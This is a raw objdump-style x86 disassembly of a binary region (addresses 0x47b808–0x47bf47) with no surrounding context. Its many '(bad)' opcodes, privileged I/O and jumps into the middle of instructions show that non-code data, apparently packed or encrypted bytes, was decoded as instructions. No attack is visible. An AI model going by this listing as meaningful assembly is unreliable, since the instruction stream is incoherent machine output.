  47b808:	sbb    BYTE PTR [ecx],dl
  47b80a:	neg    BYTE PTR fs:[edi+ebp*1+0xb]
  47b80f:	je     0x47b7a4
  47b811:	pop    ds
  47b812:	ins    BYTE PTR es:[edi],dx
  47b813:	add    eax,0x65547f9c
  47b818:	js     0x47b88e
  47b81a:	imul   ecx,DWORD PTR gs:[ebx],0xffffff96
  47b81e:	or     eax,0x1c572f2b
  47b823:	mov    bl,BYTE PTR [ebx+0x62]
  47b826:	inc    ebx
  47b827:	daa    
  47b828:	pop    ss
  47b829:	xchg   edi,eax
  47b82a:	imul   esi,DWORD PTR fs:[esi],0x82411815
  47b831:	lahf   
  47b832:	sbb    DWORD PTR [edi],edi
  47b834:	fidiv  DWORD PTR [ecx+0x43a30c00]
  47b83a:	rcr    DWORD PTR [ebx],0x32
  47b83d:	inc    edi
  47b83e:	pop    ds
  47b83f:	or     bl,cl
  47b841:	push   edi
  47b842:	test   BYTE PTR [ecx+ebp*1+0x58],dh
  47b846:	and    DWORD PTR [edi],0xa400b30f
  47b84c:	mov    ebp,0x6b717f59
  47b851:	js     0x47b81e
  47b853:	ins    BYTE PTR es:[edi],dx
  47b854:	jg     0x47b866
  47b856:	fcomip st,st(3)
  47b858:	fwait
  47b859:	and    BYTE PTR [eax+0x66],bl
  47b85c:	aaa    
  47b85d:	adc    DWORD PTR [edi],edx
  47b85f:	adc    eax,0x86bb7d37
  47b864:	add    BYTE PTR [edi],al
  47b866:	or     BYTE PTR [edi],bh
  47b868:	outs   dx,WORD PTR ds:[esi]
  47b86a:	inc    edx
  47b86b:	sub    DWORD PTR [eax],ebx
  47b86d:	jb     0x47b8a2
  47b86f:	push   0xf17f0a27
  47b874:	(bad)  
  47b875:	lock mov es,WORD PTR [esi]
  47b878:	pop    ss
  47b879:	outs   dx,BYTE PTR ds:[esi]
  47b87a:	jne    0x47b8f3
  47b87c:	pop    ds
  47b87d:	and    BYTE PTR [ecx],0xdf
  47b880:	inc    eax
  47b881:	xchg   BYTE PTR [eax],dl
  47b883:	daa    
  47b884:	bswap  edi
  47b886:	rcl    eax,1
  47b888:	(bad)  
  47b889:	or     ch,BYTE PTR es:[edi]
  47b88c:	lahf   
  47b88d:	dec    esi
  47b88e:	cs cdq 
  47b890:	sbb    al,0x7
  47b892:	xchg   BYTE PTR [edi],bh
  47b894:	push   ebx
  47b895:	arpl   WORD PTR [eax],bx
  47b897:	add    al,ch
  47b899:	mov    bl,BYTE PTR [edi-0x39]
  47b89c:	mov    ds:0x44443347,al
  47b8a1:	imul   eax,ecx,0x6f
  47b8a4:	lods   al,BYTE PTR ds:[esi]
  47b8a5:	pusha  
  47b8a6:	sbb    DWORD PTR [ebx+0x2f],0x3d
  47b8aa:	(bad)  
  47b8ab:	pop    edx
  47b8ac:	xor    bl,BYTE PTR [ebx+0x9]
  47b8af:	scas   eax,DWORD PTR es:[edi]
  47b8b0:	daa    
  47b8b1:	or     eax,0xce6e4b0d
  47b8b6:	in     eax,dx
  47b8b7:	das    
  47b8b8:	or     al,0x15
  47b8ba:	rol    dl,0x58
  47b8bd:	mov    dh,ah
  47b8bf:	jge    0x47b8cc
  47b8c1:	fist   WORD PTR [edi]
  47b8c3:	(bad)  
  47b8c4:	cli    
  47b8c5:	jg     0x47b8a3
  47b8c7:	pop    edx
  47b8c8:	nop
  47b8c9:	ret    
  47b8ca:	push   0x33
  47b8cc:	mov    ecx,0x2cd764c8
  47b8d1:	sub    BYTE PTR [esi-0x4b0f5cce],bl
  47b8d7:	pop    ds
  47b8d8:	sub    ebp,eax
  47b8da:	ret    
  47b8db:	scas   eax,DWORD PTR es:[edi]
  47b8dc:	or     cl,BYTE PTR [ecx]
  47b8de:	js     0x47b946
  47b8e0:	popa   
  47b8e1:	mov    edx,DWORD PTR gs:[eax+0x14]
  47b8e5:	pop    eax
  47b8e6:	repz ret 0x10e
  47b8ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47b8eb:	pop    ds
  47b8ec:	clc    
  47b8ed:	jmp    DWORD PTR [ecx+0x5e]
  47b8f0:	scas   eax,DWORD PTR es:[edi]
  47b8f1:	test   DWORD PTR [ecx+0x4e],0x435f4953
  47b8f8:	dec    eax
  47b8f9:	inc    ecx
  47b8fa:	push   edx
  47b8fb:	push   ebx
  47b8fc:	inc    ebp
  47b8fd:	push   esp
  47b8fe:	add    BYTE PTR [eax+0x776bfec6],cl
  47b904:	inc    esp
  47b905:	inc    ebp
  47b906:	inc    esi
  47b907:	inc    ecx
  47b908:	push   ebp
  47b909:	dec    esp
  47b90a:	push   esp
  47b90b:	xor    eax,0x690c3df7
  47b910:	jg     0x47b965
  47b912:	pop    ecx
  47b913:	dec    ebp
  47b914:	inc    edx
  47b915:	dec    edi
  47b916:	dec    esp
  47b917:	arpl   WORD PTR [edi+0x4d],bx
  47b91a:	inc    ecx
  47b91b:	inc    ebx
  47b91c:	cmp    ch,0x95
  47b91f:	adc    DWORD PTR [edi+0x10],0x48
  47b923:	dec    ecx
  47b924:	inc    esi
  47b925:	push   esp
  47b926:	dec    edx
  47b927:	dec    ecx
  47b928:	push   ebx
  47b929:	mov    edi,0x5bb3073e
  47b92e:	and    cl,BYTE PTR [esi+0x47]
  47b931:	inc    ebp
  47b932:	shl    BYTE PTR [edi+0xd],0x4a
  47b936:	dec    edi
  47b937:	enter  0xb61f,0xd6
  47b93b:	and    BYTE PTR [edx+0x61],al
  47b93e:	out    dx,eax
  47b93f:	inc    edi
  47b940:	inc    edx
  47b941:	xor    dh,BYTE PTR [ebx]
  47b943:	xor    DWORD PTR [edx],esi
  47b945:	fcmovu st,st(3)
  47b947:	out    0x4d,al
  47b949:	adc    eax,esi
  47b94b:	inc    ebx
  47b94c:	dec    esi
  47b94d:	inc    ebp
  47b94e:	and    al,BYTE PTR [edx+0x49]
  47b951:	inc    edi
  47b952:	xor    eax,0x90b06f97
  47b957:	aas    
  47b958:	inc    edi
  47b959:	push   edx
  47b95a:	inc    ebp
  47b95b:	inc    ebp
  47b95c:	dec    ebx
  47b95d:	mov    bh,0x54
  47b95f:	push   ebp
  47b960:	push   edx
  47b961:	dec    ebx
  47b962:	imul   ecx,ebp,0xffffff8e
  47b965:	in     al,0x49
  47b967:	push   ebx
  47b968:	dec    eax
  47b969:	dec    eax
  47b96a:	mov    WORD PTR [edx+0x57],fs
  47b96d:	(bad)  
  47b96e:	jl     0x47b9da
  47b970:	lods   eax,DWORD PTR ds:[esi]
  47b971:	ins    DWORD PTR es:[edi],dx
  47b972:	das    
  47b973:	sbb    al,0x41
  47b975:	mov    esi,0x41422f43
  47b97a:	dec    esp
  47b97b:	push   esp
  47b97c:	add    edi,ecx
  47b97e:	mov    ebx,0x5552bf90
  47b983:	push   ebx
  47b984:	push   ebx
  47b985:	dec    ecx
  47b986:	inc    ecx
  47b987:	dec    esi
  47b988:	lahf   
  47b989:	mov    eax,ds:0xef0cb9a1
  47b98e:	push   ds
  47b98f:	dec    ecx
  47b990:	pop    ss
  47b991:	adc    al,BYTE PTR [ebp+0x41]
  47b994:	in     al,0xa9
  47b996:	loope  0x47b965
  47b998:	push   ebx
  47b999:	push   esp
  47b99a:	push   edx
  47b99b:	dec    edi
  47b99c:	push   eax
  47b99d:	inc    ebp
  47b99e:	scas   eax,DWORD PTR es:[edi]
  47b99f:	dec    edi
  47b9a0:	inc    ebp
  47b9a1:	dec    ebp
  47b9a2:	xchg   ecx,eax
  47b9a3:	mov    dh,0x8e
  47b9a5:	aas    
  47b9a6:	push   0x11
  47b9a8:	mov    ecx,0x1f0f6668
  47b9ad:	jg     0x47b991
  47b9af:	nop
  47b9b0:	fmul   DWORD PTR [edi]
  47b9b2:	push   es
  47b9b3:	mov    al,ds:0xfb8b56cc
  47b9b8:	daa    
  47b9b9:	mov    ds:0x98bec780,al
  47b9be:	inc    esp
  47b9bf:	call   FWORD PTR [esi-0x7b]
  47b9c2:	push   esi
  47b9c3:	clc    
  47b9c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47b9c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47b9c6:	div    BYTE PTR [edi+0x73c6a54]
  47b9cc:	add    DWORD PTR [ecx+0x7c78520b],eax
  47b9d2:	popf   
  47b9d3:	sbb    ecx,DWORD PTR [edi-0x5ffb5fe0]
  47b9d9:	mov    esp,0x6ee9e402
  47b9de:	mov    edi,0x4b800430
  47b9e3:	or     DWORD PTR [ecx],eax
  47b9e5:	sbb    BYTE PTR [edx],0x14
  47b9e8:	add    DWORD PTR [ebp+0x15],esi
  47b9eb:	add    dl,BYTE PTR ds:0x67918197
  47b9f1:	add    al,0x16
  47b9f3:	or     BYTE PTR [esi+0x7889a226],al
  47b9f9:	pop    ss
  47b9fa:	mov    BYTE PTR [ebx+0xa],al
  47b9fd:	mov    ah,0x3c
  47b9ff:	call   0xb91c:0xe0412b7f
  47ba06:	and    BYTE PTR ds:0x438d3c1a,bh
  47ba0c:	or     ebp,DWORD PTR [ebx]
  47ba0e:	push   ecx
  47ba0f:	mov    edi,0x1f1fb1cf
  47ba14:	cmp    BYTE PTR [ebx+ebx*1+0x24],cl
  47ba18:	pshufw mm4,QWORD PTR [ebp+ebp*8+0x34],0x65
  47ba1e:	push   es
  47ba1f:	mov    WORD PTR [ebx+0x8],es
  47ba22:	add    cl,ah
  47ba24:	stc    
  47ba25:	mov    ecx,0xeb020ac2
  47ba2a:	add    al,0x0
  47ba2c:	push   es
  47ba2d:	loop   0x47ba89
  47ba2f:	pop    eax
  47ba30:	outs   dx,BYTE PTR ds:[esi]
  47ba31:	les    esp,FWORD PTR [eax+0x67]
  47ba34:	out    dx,eax
  47ba35:	cwde   
  47ba36:	mov    ebx,0xa3c0a706
  47ba3b:	jne    0x47b9f7
  47ba3d:	or     DWORD PTR [ecx+0x212488d8],esp
  47ba43:	and    al,0x47
  47ba45:	arpl   WORD PTR [eax+0x210895ec],si
  47ba4b:	nop
  47ba4c:	ret    0x94a1
  47ba4f:	ror    BYTE PTR es:[edx],0xa9
  47ba53:	and    BYTE PTR [esi],cl
  47ba55:	sbb    al,0x16
  47ba57:	xchg   BYTE PTR [ebp-0x4e7862e6],ch
  47ba5d:	vpcmov xmm8,xmm7,XMMWORD PTR [ebx],xmm3
  47ba63:	mov    eax,0x38407d60
  47ba68:	adc    esp,ecx
  47ba6a:	push   cs
  47ba6b:	and    BYTE PTR [ebx-0x74],ah
  47ba6e:	push   0xb75b8328
  47ba73:	inc    ecx
  47ba74:	in     eax,dx
  47ba75:	and    DWORD PTR [ecx+ebp*1],ebx
  47ba78:	mov    ebx,0x5f10b6b8
  47ba7d:	add    dl,0x1b
  47ba80:	cmp    esp,esp
  47ba82:	dec    edi
  47ba83:	add    edi,eax
  47ba85:	push   ebp
  47ba86:	mov    eax,0xcc731074
  47ba8b:	inc    ecx
  47ba8c:	or     edx,DWORD PTR [ebx+0x2fc39b1c]
  47ba92:	push   esi
  47ba93:	dec    ebx
  47ba94:	xchg   al,dl
  47ba96:	and    DWORD PTR [eax],ebx
  47ba98:	xchg   esi,eax
  47ba99:	sbb    DWORD PTR [edx+0x21085e58],esi
  47ba9f:	inc    edi
  47baa0:	cld    
  47baa1:	cmp    DWORD PTR [eax+esi*8-0x57fb79b],0x751e0c89
  47baac:	mov    edi,0x28439674
  47bab1:	mov    esp,0xe990bf5d
  47bab6:	pop    ebp
  47bab7:	int3   
  47bab8:	stc    
  47bab9:	inc    esi
  47baba:	xchg   ebp,eax
  47babb:	icebp  
  47babc:	mov    dl,0x84
  47babe:	in     eax,dx
  47babf:	cmp    esp,edi
  47bac1:	adc    BYTE PTR [edi+0x37b90312],al
  47bac7:	push   eax
  47bac8:	push   0x2f91c06c
  47bacd:	cmp    al,0x68
  47bacf:	(bad)  
  47bad0:	fcom   st(1)
  47bad2:	add    al,0xe4
  47bad4:	cli    
  47bad5:	das    
  47bad6:	cwde   
  47bad7:	add    ch,BYTE PTR [ebx+ecx*8+0x77521a72]
  47bade:	push   edi
  47badf:	xor    cl,cl
  47bae1:	adc    al,0xa5
  47bae3:	jmp    0xc0f92eb3
  47bae8:	pop    eax
  47bae9:	leave  
  47baea:	mov    cl,0xdc
  47baec:	jmp    0x47bade
  47baee:	xor    BYTE PTR [ebx+0x5604fc04],dh
  47baf4:	cmp    edx,DWORD PTR [eax+0x18]
  47baf7:	cmp    cl,BYTE PTR [eax]
  47baf9:	in     eax,0x21
  47bafb:	xor    al,0x9c
  47bafd:	rcr    DWORD PTR [esi-0x29],1
  47bb00:	mov    ah,0xa1
  47bb02:	mov    dh,0x60
  47bb04:	pop    edx
  47bb05:	mov    ah,0x4
  47bb07:	mov    eax,0x25838dc4
  47bb0c:	(bad)  
  47bb0d:	push   eax
  47bb0e:	xchg   ecx,eax
  47bb0f:	into   
  47bb10:	add    ecx,DWORD PTR [esi-0x18f256be]
  47bb16:	test   DWORD PTR [ebx],esi
  47bb18:	mov    esi,0x869624fd
  47bb1d:	and    eax,0x496955e9
  47bb22:	out    dx,eax
  47bb23:	push   edx
  47bb24:	imul   edx,esi,0x7414052e
  47bb2a:	rol    BYTE PTR [esi+0x8],0xc4
  47bb2e:	enter  0xa818,0x87
  47bb32:	xchg   edx,eax
  47bb33:	into   
  47bb34:	test   BYTE PTR [eax-0x7c],0xee
  47bb38:	ins    DWORD PTR es:[edi],dx
  47bb39:	aam    0x2c
  47bb3b:	mov    ds:0x7ebc1d0,al
  47bb40:	adc    BYTE PTR [eax+0x2cb9acaa],dl
  47bb46:	int3   
  47bb47:	xor    DWORD PTR [edx],eax
  47bb49:	mov    BYTE PTR [edx-0x68c0e62c],bh
  47bb4f:	xchg   ecx,eax
  47bb50:	retf   
  47bb51:	add    al,0xd5
  47bb53:	or     dh,dl
  47bb55:	mov    al,BYTE PTR [eax+0x1a]
  47bb58:	ds jo  0x47bb2e
  47bb5b:	push   0xfe48d710
  47bb60:	add    edx,0x1b
  47bb63:	push   ecx
  47bb64:	and    DWORD PTR [edi],0xffffffb0
  47bb67:	xor    DWORD PTR [edx+edi*4+0x4c7412a8],edi
  47bb6e:	jecxz  0x47bb92
  47bb70:	bndldx bnd3,[edx]
  47bb73:	mov    ds:0x6c825053,eax
  47bb78:	push   esi
  47bb79:	cmp    esi,DWORD PTR [esp+ebx*1+0x496d2014]
  47bb80:	sti    
  47bb81:	jns    0x47bb1b
  47bb83:	jmp    0x47bb9e
  47bb85:	jo     0x47bb3b
  47bb87:	xor    al,0xb4
  47bb89:	imul   ecx,DWORD PTR [edx+0x45c6fb4f],0xd80600da
  47bb93:	fld    DWORD PTR [eax]
  47bb95:	jecxz  0x47bb7f
  47bb97:	out    0xa6,eax
  47bb99:	inc    edi
  47bb9a:	aam    0x54
  47bb9c:	scas   al,BYTE PTR es:[edi]
  47bb9d:	or     bl,ch
  47bb9f:	pop    eax
  47bba0:	inc    ebp
  47bba1:	fild   DWORD PTR [edx]
  47bba3:	xor    DWORD PTR [esp+esi*2],edx
  47bba6:	outs   dx,BYTE PTR ds:[esi]
  47bba7:	or     al,BYTE PTR [ecx]
  47bba9:	jmp    0x47bbaf
  47bbab:	sahf   
  47bbac:	sub    DWORD PTR [eax],ebx
  47bbae:	test   al,0xa7
  47bbb0:	sbb    eax,0xc3189bd0
  47bbb5:	loopne 0x47bbcf
  47bbb7:	lods   eax,DWORD PTR ds:[esi]
  47bbb8:	jo     0x47bbc2
  47bbba:	inc    ecx
  47bbbb:	and    al,0x2c
  47bbbd:	pop    ss
  47bbbe:	or     dh,bh
  47bbc0:	out    dx,al
  47bbc1:	sbb    cl,cl
  47bbc3:	jae    0x47bbfd
  47bbc5:	push   ebx
  47bbc6:	cwde   
  47bbc7:	into   
  47bbc8:	mov    ah,0x8
  47bbca:	and    edx,DWORD PTR [edx]
  47bbcc:	push   eax
  47bbcd:	test   eax,0x8101d2d7
  47bbd2:	pop    ebp
  47bbd3:	repz ss aam 0x70
  47bbd7:	sbb    edx,DWORD PTR [edx]
  47bbd9:	xchg   edi,eax
  47bbda:	or     DWORD PTR [ebp-0x46],0x68
  47bbde:	adc    BYTE PTR [ecx+0x456d9603],dl
  47bbe4:	mov    esp,0xb6c730a0
  47bbe9:	imul   BYTE PTR [ebp-0x20]
  47bbec:	mov    cl,BYTE PTR [eax+edx*4]
  47bbef:	push   edi
  47bbf0:	inc    ebp
  47bbf1:	dec    eax
  47bbf2:	in     eax,dx
  47bbf3:	sub    BYTE PTR [ecx-0x78],ah
  47bbf6:	les    ebx,FWORD PTR [edi+0x53]
  47bbf9:	sbb    BYTE PTR [esi+0x1910bfc3],cl
  47bbff:	inc    DWORD PTR [esi-0x1c]
  47bc02:	mov    dh,dl
  47bc04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47bc05:	aam    0xa6
  47bc07:	lock sbb ch,bl
  47bc0a:	dec    eax
  47bc0b:	inc    ecx
  47bc0c:	lea    edi,[edx-0x1510fef6]
  47bc12:	stos   BYTE PTR es:[edi],al
  47bc13:	mov    edx,0xda4820b7
  47bc18:	ins    BYTE PTR es:[edi],dx
  47bc19:	xchg   edi,eax
  47bc1a:	fwait
  47bc1b:	nop
  47bc1c:	sub    al,0x2c
  47bc1e:	inc    edi
  47bc1f:	(bad)  
  47bc21:	imul   edx,DWORD PTR [ebx+ecx*1+0x73],0xc4b7be81
  47bc29:	popf   
  47bc2a:	hlt    
  47bc2b:	mov    ebx,0x486a50a0
  47bc30:	xor    eax,0xf0a1d0be
  47bc35:	neg    eax
  47bc37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47bc38:	imul   DWORD PTR [esi+0x5c]
  47bc3b:	dec    edi
  47bc3c:	xor    al,0x40
  47bc3e:	push   esi
  47bc3f:	das    
  47bc40:	fiadd  WORD PTR [ebx-0x82647c1]
  47bc46:	ficom  DWORD PTR [ecx-0x28]
  47bc49:	jp     0x47bc09
  47bc4b:	mov    dl,BYTE PTR [eax+0x19]
  47bc4e:	mov    eax,edx
  47bc50:	ja     0x47bcb3
  47bc52:	ins    BYTE PTR es:[edi],dx
  47bc53:	mov    BYTE PTR [eax-0x2d7a4046],ch
  47bc59:	xor    BYTE PTR [edi],0x76
  47bc5c:	cmp    eax,0x38c188f4
  47bc61:	dec    eax
  47bc62:	imul   edi,edx,0xd
  47bc65:	and    edx,esp
  47bc67:	xor    BYTE PTR [edi+0x6edf0daf],al
  47bc6d:	outs   dx,BYTE PTR ds:[esi]
  47bc6e:	inc    eax
  47bc6f:	sbb    BYTE PTR [edi],ch
  47bc71:	sti    
  47bc72:	xchg   DWORD PTR ds:0x62bea20f,ecx
  47bc78:	mov    BYTE PTR [ecx+edi*2-0x71],bl
  47bc7c:	and    eax,0x5e1b4817
  47bc81:	sbb    cl,BYTE PTR [edx]
  47bc83:	push   es
  47bc84:	jl     0x47bcba
  47bc86:	and    BYTE PTR [edi-0x46],dl
  47bc89:	clc    
  47bc8a:	dec    ax
  47bc8c:	sub    BYTE PTR [edi*2+0x46c6dc92],ah
  47bc93:	sbb    BYTE PTR [edi+esi*4],al
  47bc96:	or     esp,DWORD PTR [ecx+eax*1+0x72dc360b]
  47bc9d:	leave  
  47bc9e:	test   eax,0xb834ff00
  47bca3:	and    DWORD PTR [ecx],0x27
  47bca6:	nop
  47bca7:	pop    ss
  47bca8:	push   edi
  47bca9:	sar    DWORD PTR [edx],1
  47bcab:	rol    DWORD PTR [eax-0x238df37d],1
  47bcb1:	mov    al,dl
  47bcb3:	pushf  
  47bcb4:	and    DWORD PTR [edi+0x41c74790],ebp
  47bcba:	shr    DWORD PTR [ecx-0x2f],1
  47bcbd:	test   BYTE PTR [esi],cl
  47bcbf:	jo     0x47bcd4
  47bcc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47bcc2:	add    cl,al
  47bcc4:	nop
  47bcc5:	adc    eax,DWORD PTR [eax+esi*2]
  47bcc8:	lahf   
  47bcc9:	(bad)  
  47bcca:	int    0xd1
  47bccc:	adc    cl,al
  47bcce:	and    ebx,DWORD PTR [ecx+0x25d1d4dc]
  47bcd4:	das    
  47bcd5:	sbb    DWORD PTR [eax+0x6cc1f007],ebx
  47bcdb:	or     ah,BYTE PTR es:[esi-0x15]
  47bcdf:	rol    DWORD PTR [eax+eax*4-0x47fd4251],0x94
  47bce7:	mov    edi,es
  47bce9:	jne    0x47bd63
  47bceb:	pop    esi
  47bcec:	enter  0xb00b,0xdf
  47bcf0:	mov    edi,0x3875d28e
  47bcf5:	inc    edi
  47bcf6:	fcos   
  47bcf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47bcf9:	adc    al,0xb6
  47bcfb:	inc    eax
  47bcfc:	sbb    al,0xf
  47bcfe:	mov    bh,0x4
  47bd00:	inc    ebp
  47bd01:	or     BYTE PTR [edi+0x54],ah
  47bd04:	pop    ds
  47bd05:	xor    al,0x8
  47bd07:	mov    cl,0x81
  47bd09:	pop    ebp
  47bd0a:	add    BYTE PTR [edx-0x17],dh
  47bd0d:	xor    bl,BYTE PTR [ebx+0x4830b808]
  47bd13:	in     al,dx
  47bd14:	call   0x17e607eb
  47bd19:	xchg   ebp,eax
  47bd1a:	rcr    ah,cl
  47bd1c:	cs mov al,0x7
  47bd1f:	or     BYTE PTR fs:[edi],bl
  47bd22:	push   esi
  47bd23:	cmp    dl,BYTE PTR [esi-0x78]
  47bd26:	fs in  al,0x51
  47bd29:	inc    eax
  47bd2a:	das    
  47bd2b:	sbb    al,0xf0
  47bd2d:	lods   al,BYTE PTR ds:[esi]
  47bd2e:	pusha  
  47bd2f:	repnz mov esp,0xb70c6cc1
  47bd35:	pop    eax
  47bd36:	sbb    ecx,DWORD PTR [ebx+0x3e]
  47bd39:	pop    ss
  47bd3a:	sbb    BYTE PTR [edx+0x15],dl
  47bd3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47bd3e:	fs pusha 
  47bd40:	pop    ds
  47bd41:	or     BYTE PTR [edi+0x79e4b441],dl
  47bd47:	sbb    BYTE PTR [edi-0x20],ah
  47bd4a:	(bad)  
  47bd4b:	popa   
  47bd4c:	pop    ebp
  47bd4d:	sbb    DWORD PTR [eax+eiz*8-0x47],0x47440e40
  47bd55:	stos   DWORD PTR es:[edi],eax
  47bd56:	js     0x47bcdf
  47bd58:	adc    ah,dl
  47bd5a:	sub    al,cl
  47bd5c:	test   DWORD PTR [ebx+esi*8+0x5e4ae0d3],ebx
  47bd63:	and    DWORD PTR [edi+0x22d3fa71],ecx
  47bd69:	aam    0x52
  47bd6b:	pop    esp
  47bd6c:	sub    bl,BYTE PTR [edx-0x6ff99070]
  47bd72:	push   ds
  47bd73:	push   eax
  47bd74:	rcl    DWORD PTR [edx],0x8f
  47bd77:	aas    
  47bd78:	mov    esp,edx
  47bd7a:	and    BYTE PTR [edi-0x6f1fbf1c],al
  47bd80:	aam    0x76
  47bd82:	cmp    edi,DWORD PTR [esp+ecx*2]
  47bd85:	push   edi
  47bd86:	out    dx,al
  47bd87:	mov    esi,0xdbfc8bdd
  47bd8c:	mov    DWORD PTR [ebp+eiz*2+0x3a],edx
  47bd90:	das    
  47bd91:	sub    al,0x43
  47bd93:	les    eax,FWORD PTR ds:[eax+0x5f]
  47bd97:	aas    
  47bd98:	jno    0x47bda8
  47bd9a:	adc    DWORD PTR [edi+0xc2024c4],edi
  47bda0:	add    DWORD PTR [esp+ebp*8],esi
  47bda3:	push   ebx
  47bda4:	aam    0x75
  47bda6:	add    eax,0x4031009a
  47bdab:	or     BYTE PTR [eax],bl
  47bdad:	enter  0xd744,0xf0
  47bdb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47bdb2:	(bad)  
  47bdb3:	sub    BYTE PTR [edi],0x3
  47bdb6:	inc    edi
  47bdb7:	popf   
  47bdb8:	rcl    ebp,0x94
  47bdbb:	push   0x7bdf21a2
  47bdc0:	mov    ebx,0x5a93a60
  47bdc5:	loopne 0x47bd85
  47bdc7:	add    ebp,DWORD PTR [esi]
  47bdc9:	xchg   ecx,eax
  47bdca:	cmp    eax,0x2f6ccf82
  47bdcf:	cmp    BYTE PTR [edx+esi*1+0x57],ah
  47bdd3:	cmp    BYTE PTR [eax],al
  47bdd5:	scas   al,BYTE PTR es:[edi]
  47bdd6:	ss sar al,0x4d
  47bdda:	in     eax,dx
  47bddb:	mov    al,0x30
  47bddd:	dec    esp
  47bdde:	lock jmp 0x463b:0xbbbcec01
  47bde6:	or     ebx,ebp
  47bde8:	adc    BYTE PTR [ebx],ch
  47bdea:	lock jmp 0x47be06
  47bded:	je     0x47bdf0
  47bdef:	push   ds
  47bdf0:	jp     0x47be59
  47bdf2:	xchg   esp,eax
  47bdf3:	icebp  
  47bdf4:	adc    BYTE PTR [edx],al
  47bdf6:	sti    
  47bdf7:	call   0x5ccd1efe
  47bdfc:	call   0x52a8:0xf0f4656b
  47be03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47be04:	nop
  47be05:	out    0xc8,eax
  47be07:	aad    0xe0
  47be09:	push   ds
  47be0a:	mov    eax,ds:0x3f6210c1
  47be0f:	adc    cl,BYTE PTR ss:[eax-0x296c55c0]
  47be16:	and    al,0xb6
  47be18:	or     BYTE PTR [edi+0x4c613074],dl
  47be1e:	mov    ah,0x3b
  47be20:	(bad)  
  47be21:	nop
  47be22:	or     esp,DWORD PTR [ebx]
  47be24:	push   0x11
  47be26:	dec    edi
  47be27:	jg     0x47be4b
  47be29:	enter  0x984e,0x47
  47be2d:	cmp    bl,bl
  47be2f:	add    DWORD PTR [ebx-0x4f374012],edi
  47be35:	sbb    al,0xba
  47be37:	adc    cl,BYTE PTR [ecx+0x46c70c7e]
  47be3d:	or     al,dl
  47be3f:	fld    QWORD PTR [ecx+0x47]
  47be42:	mov    esp,0xac090e7c
  47be47:	inc    eax
  47be48:	xor    al,0xb8
  47be4a:	ror    BYTE PTR [eax-0x69],0x3
  47be4e:	sbb    DWORD PTR [ecx-0x3c460ff0],ebp
  47be54:	js     0x47bde6
  47be56:	and    edx,DWORD PTR [ebp-0x21efebec]
  47be5c:	mov    DWORD PTR [edi+0x20],0x1afa12c6
  47be63:	shl    BYTE PTR [eax+0x12f2d6d0],0x7a
  47be6a:	mov    cl,0x54
  47be6c:	xchg   esp,eax
  47be6d:	popf   
  47be6e:	xor    al,0x90
  47be70:	mov    DWORD PTR [eax],ecx
  47be72:	les    esp,FWORD PTR [eax+0x1a33a7f1]
  47be78:	ret    
  47be79:	lods   al,BYTE PTR ds:[esi]
  47be7a:	(bad)  
  47be7b:	or     eax,0x39cc612c
  47be80:	imul   ebx,DWORD PTR [ebx+0xe05048c],0x70b01410
  47be8a:	add    al,0x7c
  47be8c:	lea    eax,[esi+0x38]
  47be8f:	stc    
  47be90:	xor    DWORD PTR [ecx],ebx
  47be92:	cmp    BYTE PTR [edx],ah
  47be94:	xchg   ecx,eax
  47be95:	nop
  47be96:	idiv   DWORD PTR [edx+0x7d38cbe1]
  47be9c:	or     BYTE PTR [ebx-0x284fea20],cl
  47bea2:	sbb    BYTE PTR [edx-0x3c65c453],ah
  47bea8:	rcr    DWORD PTR [eax+0x18],0xb4
  47beac:	xlat   BYTE PTR ds:[ebx]
  47bead:	mov    ch,0xcc
  47beaf:	(bad)  
  47beb1:	dec    ch
  47beb3:	xchg   edx,eax
  47beb4:	and    BYTE PTR [edx-0x75],dl
  47beb7:	push   edi
  47beb8:	or     al,0x2b
  47beba:	push   edi
  47bebb:	add    al,0xc
  47bebd:	or     BYTE PTR [ebx],ch
  47bebf:	pop    ss
  47bec0:	or     dl,BYTE PTR [edx]
  47bec2:	scas   al,BYTE PTR es:[edi]
  47bec3:	imul   eax,DWORD PTR [esi-0x40],0x5634650c
  47beca:	push   esi
  47becb:	or     eax,0x6eec025a
  47bed0:	xchg   esp,eax
  47bed1:	push   es
  47bed2:	sub    edx,eax
  47bed4:	push   cs
  47bed5:	push   ss
  47bed6:	push   esi
  47bed7:	sbb    DWORD PTR [eax+0x405817bd],ebx
  47bedd:	mov    ebx,0x4691b0c
  47bee2:	popf   
  47bee3:	xlat   BYTE PTR ds:[ebx]
  47bee4:	add    BYTE PTR [ebx],cl
  47bee6:	push   es
  47bee7:	or     DWORD PTR [edi-0x14],ebp
  47beea:	or     esp,DWORD PTR [esi-0x7d77fcbf]
  47bef0:	add    al,0x15
  47bef2:	rol    BYTE PTR [edi],1
  47bef4:	lds    ebx,FWORD PTR [eax+eiz*4]
  47bef7:	ja     0x47bf32
  47bef9:	cld    
  47befa:	or     DWORD PTR ds:0xb5d86079,ecx
  47bf00:	les    esi,FWORD PTR [ecx+edx*4-0x308278b6]
  47bf07:	rcl    DWORD PTR [edi-0x10],cl
  47bf0a:	xor    BYTE PTR [ecx+eax*4+0x29b07b3a],al
  47bf11:	pop    eax
  47bf12:	sub    BYTE PTR [ebp+0x56500320],dl
  47bf18:	mov    dh,0x80
  47bf1a:	rol    BYTE PTR [edx+0x30e7851d],cl
  47bf20:	mov    ch,0x46
  47bf22:	add    ecx,edi
  47bf24:	xchg   ecx,eax
  47bf25:	add    DWORD PTR ds:0xc20ad044,ebx
  47bf2b:	xor    ebp,DWORD PTR [edi]
  47bf2d:	add    edx,DWORD PTR [ebx+eiz*4]
  47bf30:	adc    eax,0xbb5d52a2
  47bf35:	shl    DWORD PTR [edi+eax*2],cl
  47bf38:	jo     0x47bf42
  47bf3a:	lahf   
  47bf3b:	pop    ss
  47bf3c:	pushf  
  47bf3d:	mov    ebp,ebp
  47bf3f:	lods   eax,DWORD PTR ds:[esi]
  47bf40:	push   0x59e556d0
  47bf45:	jo     0x47becc
  47bf47:	cdq    
